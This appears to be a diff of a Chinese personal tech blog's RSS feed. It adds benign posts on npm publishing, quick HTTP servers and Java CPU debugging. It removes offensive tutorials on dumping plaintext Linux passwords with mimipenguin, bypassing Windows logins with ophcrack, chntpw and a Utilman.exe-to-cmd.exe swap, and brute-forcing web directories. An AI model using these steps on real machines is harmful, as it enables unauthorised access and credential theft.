+  &lt;li&gt;preferGlobal 的设置是若用户使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;npm install --save&lt;/code&gt; 而不是 &lt;code class=&quot;highlighter-rouge&quot;&gt;npm install --gobal&lt;/code&gt; 的方式进行安装，将会发出警告。&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;首次上传的话你需要有 npm 的账号信息，若没有请去 &lt;a href=&quot;https://www.npmjs.com/&quot;&gt;https://www.npmjs.com/&lt;/a&gt; 进行注册，注册完成后，先使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;npm adduser&lt;/code&gt; 将账号信息在电脑中进行验证，最后在根路径中执行 &lt;code class=&quot;highlighter-rouge&quot;&gt;npm publish&lt;/code&gt; 命令进行发布即可。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;本文中所有的示例代码在 &lt;a href=&quot;https://github.com/wangjunneil/weather-cli&quot;&gt;https://github.com/wangjunneil/weather-cli&lt;/a&gt; 可以获取到&lt;/p&gt;
+&lt;/blockquote&gt;
+</description>  
+               <pubDate>Tue, 08 May 2018 00:00:00 +0800</pubDate>  
+               <link>http://www.vinny.cc/2018/05/create-publish-nodejs-cli/</link>  
+               <guid isPermaLink="true">http://www.vinny.cc/2018/05/create-publish-nodejs-cli/</guid>  
+               </item>  
+          
+            <item>  
+               <title>快速创建简易HTTP服务器的方式</title>  
+               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#1-python-方式&quot; id=&quot;markdown-toc-1-python-方式&quot;&gt;1. Python 方式&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#2-php-方式&quot; id=&quot;markdown-toc-2-php-方式&quot;&gt;2. Php 方式&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#3-ruby-方式&quot; id=&quot;markdown-toc-3-ruby-方式&quot;&gt;3. Ruby 方式&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#4-npm-方式&quot; id=&quot;markdown-toc-4-npm-方式&quot;&gt;4. Npm 方式&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;1-python-方式&quot;&gt;1. Python 方式&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; SimpleHTTPServer 8000
+python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 8000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;2-php-方式&quot;&gt;2. Php 方式&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; 0.0.0.0:80000
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;3-ruby-方式&quot;&gt;3. Ruby 方式&lt;/h2&gt;
+
+&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ruby &lt;span class=&quot;nt&quot;&gt;-rwebrick&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;
+&lt;span class=&quot;s2&quot;&gt;&quot;WEBrick::HTTPServer.new(:Port =&amp;gt; 8000, :DocumentRoot =&amp;gt; Dir.pwd).start&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;4-npm-方式&quot;&gt;4. Npm 方式&lt;/h2&gt;
+
+&lt;p&gt;可以全局安装&lt;code class=&quot;highlighter-rouge&quot;&gt;npm install http-server -g &lt;/code&gt;，也可以使用&lt;code class=&quot;highlighter-rouge&quot;&gt;npm install&lt;/code&gt;方式安装&lt;/p&gt;
+
+&lt;div class=&quot;language-json highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;s2&quot;&gt;&quot;scripts&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+	&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;start&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http-server -c-1 -p 8081&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;devDependencies&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+	&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http-server&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;^0.11.1&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+</description>  
+               <pubDate>Mon, 07 May 2018 00:00:00 +0800</pubDate>  
+               <link>http://www.vinny.cc/2018/05/http-server-ways/</link>  
+               <guid isPermaLink="true">http://www.vinny.cc/2018/05/http-server-ways/</guid>  
+               </item>  
+          
+            <item>  
+               <title>Linux分析Java进程中哪个线程占用了大量的CPU</title>  
+               <description>
+&lt;p&gt;当运行在服务器中的 Java 程序越来越慢，&lt;code class=&quot;highlighter-rouge&quot;&gt;top&lt;/code&gt; 查看 CPU 的使用率非常高，确定是某个 Java 进程在占用过多的 CPU，此时定位是哪部分代码或者业务导致。&lt;/p&gt;
+
+&lt;p&gt;主要分为以下几个步骤实现：&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;1. 使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;top -H -p [pid]&lt;/code&gt; 命令列出进程的所有线程&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/cpu_1.png&quot; alt=&quot;cpu_1&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;通过上述命令，这里假定发现ID为”&lt;strong&gt;5171&lt;/strong&gt;“的线程占用了 75% 的CPU&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;2. 使用计算器将十进制的线程ID”5171”转换成16进制&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;这里计算后的结果是 “&lt;strong&gt;0x1433&lt;/strong&gt;”&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/cpu_2.png&quot; alt=&quot;cpu_2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3. 使用命令 &lt;code class=&quot;highlighter-rouge&quot;&gt;jstack [pid] &amp;gt; jstack.txt&lt;/code&gt; 导出进程中所有线程上下文&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/cpu_3.png&quot; alt=&quot;cpu_3&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;4. 使用命令 &lt;code class=&quot;highlighter-rouge&quot;&gt;cat jstack.txt | grep -i 1433&lt;/code&gt; 查找匹配的线程ID&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;http://ohdpyqlwy.bkt.clouddn.com/cpu_4.png&quot; alt=&quot;cpu_4&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从上述输出的信息可以直接得出执行的堆栈，从而确定哪部分代码出现了问题&lt;/p&gt;
+
+</description>  
+               <pubDate>Sun, 06 May 2018 00:00:00 +0800</pubDate>  
+               <link>http://www.vinny.cc/2018/05/analysis-thread-cpu/</link>  
+               <guid isPermaLink="true">http://www.vinny.cc/2018/05/analysis-thread-cpu/</guid>  
+               </item>  
+          
+            <item>  
                <title>使用 apt-get update 签名错误 invalid signature 的处理</title>  
                <description>
 &lt;hr /&gt;
@@ -881,19 +1830,12 @@ git push &lt;span class=&quot;nt&quot;&gt;--tags&lt;/span&gt;
             <item>  
                <title>通过U盘使用Link漏洞进行攻击</title>  
                <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#通过u盘使用link漏洞进行攻击&quot; id=&quot;markdown-toc-通过u盘使用link漏洞进行攻击&quot;&gt;通过U盘使用Link漏洞进行攻击&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#1-下载漏洞脚本&quot; id=&quot;markdown-toc-1-下载漏洞脚本&quot;&gt;1. 下载漏洞脚本&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#2-安装漏洞脚本&quot; id=&quot;markdown-toc-2-安装漏洞脚本&quot;&gt;2. 安装漏洞脚本&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#3-启动监听并生成文件&quot; id=&quot;markdown-toc-3-启动监听并生成文件&quot;&gt;3. 启动监听并生成文件&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#4-制作渗透u盘&quot; id=&quot;markdown-toc-4-制作渗透u盘&quot;&gt;4. 制作渗透U盘&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#5-触发漏洞得到shell&quot; id=&quot;markdown-toc-5-触发漏洞得到shell&quot;&gt;5. 触发漏洞得到Shell&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#1-下载漏洞脚本&quot; id=&quot;markdown-toc-1-下载漏洞脚本&quot;&gt;1. 下载漏洞脚本&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#2-安装漏洞脚本&quot; id=&quot;markdown-toc-2-安装漏洞脚本&quot;&gt;2. 安装漏洞脚本&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#3-启动监听并生成文件&quot; id=&quot;markdown-toc-3-启动监听并生成文件&quot;&gt;3. 启动监听并生成文件&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#4-制作渗透u盘&quot; id=&quot;markdown-toc-4-制作渗透u盘&quot;&gt;4. 制作渗透U盘&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#5-触发漏洞得到shell&quot; id=&quot;markdown-toc-5-触发漏洞得到shell&quot;&gt;5. 触发漏洞得到Shell&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;通过u盘使用link漏洞进行攻击&quot;&gt;通过U盘使用Link漏洞进行攻击&lt;/h1&gt;
 
 &lt;h2 id=&quot;1-下载漏洞脚本&quot;&gt;1. 下载漏洞脚本&lt;/h2&gt;
 
@@ -964,18 +1906,11 @@ msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&qu
             <item>  
                <title>U盘伪装快捷方式欺骗攻击</title>  
                <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#u盘伪装快捷方式欺骗攻击&quot; id=&quot;markdown-toc-u盘伪装快捷方式欺骗攻击&quot;&gt;U盘伪装快捷方式欺骗攻击&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#1-生成脚本木马&quot; id=&quot;markdown-toc-1-生成脚本木马&quot;&gt;1. 生成脚本木马&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#2-u盘放置木马&quot; id=&quot;markdown-toc-2-u盘放置木马&quot;&gt;2. U盘放置木马&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#3-伪装隐藏&quot; id=&quot;markdown-toc-3-伪装隐藏&quot;&gt;3. 伪装隐藏&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#4-诱骗点击&quot; id=&quot;markdown-toc-4-诱骗点击&quot;&gt;4. 诱骗点击&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#1-生成脚本木马&quot; id=&quot;markdown-toc-1-生成脚本木马&quot;&gt;1. 生成脚本木马&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#2-u盘放置木马&quot; id=&quot;markdown-toc-2-u盘放置木马&quot;&gt;2. U盘放置木马&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#3-伪装隐藏&quot; id=&quot;markdown-toc-3-伪装隐藏&quot;&gt;3. 伪装隐藏&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#4-诱骗点击&quot; id=&quot;markdown-toc-4-诱骗点击&quot;&gt;4. 诱骗点击&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;u盘伪装快捷方式欺骗攻击&quot;&gt;U盘伪装快捷方式欺骗攻击&lt;/h1&gt;
 
 &lt;h2 id=&quot;1-生成脚本木马&quot;&gt;1. 生成脚本木马&lt;/h2&gt;
 
@@ -999,291 +1934,6 @@ msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;42382&lt;span class=&qu
                <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
                <link>http://www.vinny.cc/2017/11/u-fake-attacker/</link>  
                <guid isPermaLink="true">http://www.vinny.cc/2017/11/u-fake-attacker/</guid>  
-               </item>  
-          
-            <item>  
-               <title>使用mimipenguin工具在Linux系统中dump出明文密码</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#使用mimipenguin工具在linux系统中dump出明文密码&quot; id=&quot;markdown-toc-使用mimipenguin工具在linux系统中dump出明文密码&quot;&gt;使用mimipenguin工具在Linux系统中dump出明文密码&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#1-原理&quot; id=&quot;markdown-toc-1-原理&quot;&gt;1. 原理&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#3-下载&quot; id=&quot;markdown-toc-3-下载&quot;&gt;3. 下载&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#4-使用&quot; id=&quot;markdown-toc-4-使用&quot;&gt;4. 使用&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;使用mimipenguin工具在linux系统中dump出明文密码&quot;&gt;使用mimipenguin工具在Linux系统中dump出明文密码&lt;/h1&gt;
-
-&lt;h2 id=&quot;1-原理&quot;&gt;1. 原理&lt;/h2&gt;
-
-&lt;p&gt;&lt;strong&gt;mimipenguin&lt;/strong&gt; 使用内存计算的技术，读取内存中的凭证信息，linux系统在运行中会将用户名和密码以明文的方式保存在内存中。&lt;/p&gt;
-
-&lt;h2 id=&quot;3-下载&quot;&gt;3. 下载&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/huntergregal/mimipenguin.git
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;4-使用&quot;&gt;4. 使用&lt;/h2&gt;
-
-&lt;p&gt;在目标机器直接运行&lt;code class=&quot;highlighter-rouge&quot;&gt;mimipenguin&lt;/code&gt;命令，如下：&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# shell&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;u+x mimipenguin.py
-./mimipenguin.sh
-
-&lt;span class=&quot;c&quot;&gt;# python&lt;/span&gt;
-python3 ./mimipenguin.py
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-</description>  
-               <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/dump-password-linux/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/dump-password-linux/</guid>  
-               </item>  
-          
-            <item>  
-               <title>破解windows密码的几种常用方式</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#破解windows密码的几种常用方式&quot; id=&quot;markdown-toc-破解windows密码的几种常用方式&quot;&gt;破解windows密码的几种常用方式&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#1-前提说明&quot; id=&quot;markdown-toc-1-前提说明&quot;&gt;1. 前提说明&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#2-基于ophcrack的猜解&quot; id=&quot;markdown-toc-2-基于ophcrack的猜解&quot;&gt;2. 基于Ophcrack的猜解&lt;/a&gt;        &lt;ul&gt;
-          &lt;li&gt;&lt;a href=&quot;#21-u盘启动&quot; id=&quot;markdown-toc-21-u盘启动&quot;&gt;2.1 U盘启动&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#22-使用ophcrack&quot; id=&quot;markdown-toc-22-使用ophcrack&quot;&gt;2.2 使用ophcrack&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#23-在线破解hashcode&quot; id=&quot;markdown-toc-23-在线破解hashcode&quot;&gt;2.3 在线破解hashcode&lt;/a&gt;&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#3-基于chntpw破解工具&quot; id=&quot;markdown-toc-3-基于chntpw破解工具&quot;&gt;3. 基于chntpw破解工具&lt;/a&gt;        &lt;ul&gt;
-          &lt;li&gt;&lt;a href=&quot;#31-u盘启动&quot; id=&quot;markdown-toc-31-u盘启动&quot;&gt;3.1 U盘启动&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#32-定位到sam目录&quot; id=&quot;markdown-toc-32-定位到sam目录&quot;&gt;3.2 定位到SAM目录&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#33-使用chntpw工具&quot; id=&quot;markdown-toc-33-使用chntpw工具&quot;&gt;3.3 使用chntpw工具&lt;/a&gt;&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#4-基于文件系统的替换&quot; id=&quot;markdown-toc-4-基于文件系统的替换&quot;&gt;4. 基于文件系统的替换&lt;/a&gt;        &lt;ul&gt;
-          &lt;li&gt;&lt;a href=&quot;#41-u盘启动&quot; id=&quot;markdown-toc-41-u盘启动&quot;&gt;4.1 U盘启动&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#42-定位到sys目录&quot; id=&quot;markdown-toc-42-定位到sys目录&quot;&gt;4.2 定位到SYS目录&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#43-替换特殊文件&quot; id=&quot;markdown-toc-43-替换特殊文件&quot;&gt;4.3 替换特殊文件&lt;/a&gt;&lt;/li&gt;
-          &lt;li&gt;&lt;a href=&quot;#44-打开命令行程序&quot; id=&quot;markdown-toc-44-打开命令行程序&quot;&gt;4.4 打开命令行程序&lt;/a&gt;&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;破解windows密码的几种常用方式&quot;&gt;破解windows密码的几种常用方式&lt;/h1&gt;
-
-&lt;h2 id=&quot;1-前提说明&quot;&gt;1. 前提说明&lt;/h2&gt;
-
-&lt;p&gt;以下三种方式破解windows是基于 &lt;strong&gt;kali live usb&lt;/strong&gt; 的方式，即需要准备一个安装了kali系统的U盘。&lt;/p&gt;
-
-&lt;h2 id=&quot;2-基于ophcrack的猜解&quot;&gt;2. 基于Ophcrack的猜解&lt;/h2&gt;
-
-&lt;h3 id=&quot;21-u盘启动&quot;&gt;2.1 U盘启动&lt;/h3&gt;
-
-&lt;p&gt;接上安装kali系统U盘，重新引导并使用U盘系统启动&lt;/p&gt;
-
-&lt;h3 id=&quot;22-使用ophcrack&quot;&gt;2.2 使用ophcrack&lt;/h3&gt;
-
-&lt;p&gt;打开终端，输入命令&lt;code class=&quot;highlighter-rouge&quot;&gt;ophcrack&lt;/code&gt;，点击ophcrack工具栏中 &lt;strong&gt;load&lt;/strong&gt; 按钮，选择 &lt;strong&gt;Encrypted SAM&lt;/strong&gt;，此时弹出选择目录的对话框，选择windows硬盘的 ++windows/system32/config++ 目录。&lt;/p&gt;
-
-&lt;p&gt;待读取SAM数据库后会显示出windows系统的用户列表及其 &lt;strong&gt;hashcode&lt;/strong&gt; 值&lt;/p&gt;
-
-&lt;h3 id=&quot;23-在线破解hashcode&quot;&gt;2.3 在线破解hashcode&lt;/h3&gt;
-
-&lt;p&gt;将读取到的hashcode复制，粘贴到在线破解NTLM的网站中去，可用的在线破解站点有：&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://hashkiller.co.uk/ntlm-decrypter.aspx&quot;&gt;https://hashkiller.co.uk/ntlm-decrypter.aspx&lt;/a&gt;
-&lt;a href=&quot;https://crackstation.net/code&quot;&gt;https://crackstation.net/code&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;3-基于chntpw破解工具&quot;&gt;3. 基于chntpw破解工具&lt;/h2&gt;
-
-&lt;h3 id=&quot;31-u盘启动&quot;&gt;3.1 U盘启动&lt;/h3&gt;
-
-&lt;p&gt;接上安装kali系统U盘，重新引导并使用U盘系统启动&lt;/p&gt;
-
-&lt;h3 id=&quot;32-定位到sam目录&quot;&gt;3.2 定位到SAM目录&lt;/h3&gt;
-
-&lt;p&gt;打开终端，&lt;code class=&quot;highlighter-rouge&quot;&gt;cd&lt;/code&gt;进入windows系统的SAM数据库目录（++windows/system32/config++ ）&lt;/p&gt;
-
-&lt;h3 id=&quot;33-使用chntpw工具&quot;&gt;3.3 使用chntpw工具&lt;/h3&gt;
-
-&lt;p&gt;在SAM目录中，输入命令&lt;code class=&quot;highlighter-rouge&quot;&gt;chntpw -l SAM&lt;/code&gt;读取windows系统用户列表，确定好用户后，输入命令&lt;code class=&quot;highlighter-rouge&quot;&gt;chntpw -u administrator SAM&lt;/code&gt;进入交互模式，选择 &lt;strong&gt;1&lt;/strong&gt; 清除目标用户密码。&lt;/p&gt;
-
-&lt;p&gt;拔出U盘，再次重新进入windows系统，此时清除的目标用户已经不需要密码即可登录。&lt;/p&gt;
-
-&lt;h2 id=&quot;4-基于文件系统的替换&quot;&gt;4. 基于文件系统的替换&lt;/h2&gt;
-
-&lt;h3 id=&quot;41-u盘启动&quot;&gt;4.1 U盘启动&lt;/h3&gt;
-
-&lt;p&gt;接上安装kali系统U盘，重新引导并使用U盘系统启动&lt;/p&gt;
-
-&lt;h3 id=&quot;42-定位到sys目录&quot;&gt;4.2 定位到SYS目录&lt;/h3&gt;
-
-&lt;p&gt;打开终端，&lt;code class=&quot;highlighter-rouge&quot;&gt;cd&lt;/code&gt;进入windows系统的System32目录（++windows/system32++）&lt;/p&gt;
-
-&lt;h3 id=&quot;43-替换特殊文件&quot;&gt;4.3 替换特殊文件&lt;/h3&gt;
-
-&lt;p&gt;使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;mv Utilman.exe Utilman.exe.bak&lt;/code&gt;将windows辅助程序进行备份，&lt;code class=&quot;highlighter-rouge&quot;&gt;cp cmd.exe Utilman.exe&lt;/code&gt;复制一个命令行程序为辅助程序的名称，拔出U盘重新启动进入window登录界面。&lt;/p&gt;
-
-&lt;h3 id=&quot;44-打开命令行程序&quot;&gt;4.4 打开命令行程序&lt;/h3&gt;
-
-&lt;p&gt;在windows登录界面右下角，点击辅助程序即可打开windows命令行程序，使用命令&lt;code class=&quot;highlighter-rouge&quot;&gt;net user&lt;/code&gt;查看当前用户，&lt;code class=&quot;highlighter-rouge&quot;&gt;net user vinny *&lt;/code&gt;创建一个不带密码的用户，重启即可进入。&lt;/p&gt;
-</description>  
-               <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/crack-windows-password/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/crack-windows-password/</guid>  
-               </item>  
-          
-            <item>  
-               <title>几种暴力破解web服务器目录的方式</title>  
-               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#几种暴力破解web服务器目录的方式&quot; id=&quot;markdown-toc-几种暴力破解web服务器目录的方式&quot;&gt;几种暴力破解web服务器目录的方式&lt;/a&gt;    &lt;ul&gt;
-      &lt;li&gt;&lt;a href=&quot;#1-dirb&quot; id=&quot;markdown-toc-1-dirb&quot;&gt;1. dirb&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#2-dirbuster&quot; id=&quot;markdown-toc-2-dirbuster&quot;&gt;2. dirbuster&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#3-metasploit&quot; id=&quot;markdown-toc-3-metasploit&quot;&gt;3. metasploit&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#4-dirsearch&quot; id=&quot;markdown-toc-4-dirsearch&quot;&gt;4. dirsearch&lt;/a&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;h1 id=&quot;几种暴力破解web服务器目录的方式&quot;&gt;几种暴力破解web服务器目录的方式&lt;/h1&gt;
-
-&lt;h2 id=&quot;1-dirb&quot;&gt;1. dirb&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;dir &lt;/span&gt;http://xxx.xxx.xxx
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;词典路径 /usr/share/dirb/wordlists&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;2-dirbuster&quot;&gt;2. dirbuster&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;dirbuster
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dirbuster&lt;/code&gt;是图形化的界面，默认词典路径 /usr/share/dirbuster/wordlists&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h2 id=&quot;3-metasploit&quot;&gt;3. metasploit&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/http/dir_scanner
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;4-dirsearch&quot;&gt;4. dirsearch&lt;/h2&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/maurosoria/dirsearch
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-</description>  
-               <pubDate>Sun, 12 Nov 2017 00:00:00 +0800</pubDate>  
-               <link>http://www.vinny.cc/2017/11/brute-crack-dir-in-web/</link>  
-               <guid isPermaLink="true">http://www.vinny.cc/2017/11/brute-crack-dir-in-web/</guid>  
-               </item>  
